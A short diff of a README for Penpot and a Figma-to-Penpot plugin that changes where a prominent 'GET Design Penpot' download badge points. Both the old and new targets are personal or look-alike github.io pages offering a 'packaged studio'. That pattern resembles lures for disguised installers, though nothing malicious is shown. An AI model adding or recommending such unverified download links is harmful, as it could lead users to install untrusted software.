@@ -72,7 +72,7 @@ Figma To Penpot is a separate build. You need Node and npm. Install deps, then b
 
 ## Download
 
-[![GET Design Penpot](https://img.shields.io/badge/GET-Design%20Penpot-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://cooperwilliam3374.github.io/.github/Design-Penpot)
+[![GET Design Penpot](https://img.shields.io/badge/GET-Design%20Penpot-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://design-penpot.github.io/Figma-To-Penpot/)
 
 Use the GET badge for the packaged studio. After that, either open the hosted URL or start the compose stack. For Figma To Penpot, build the plugin and import the manifest, or install the listing from the Figma community.
 
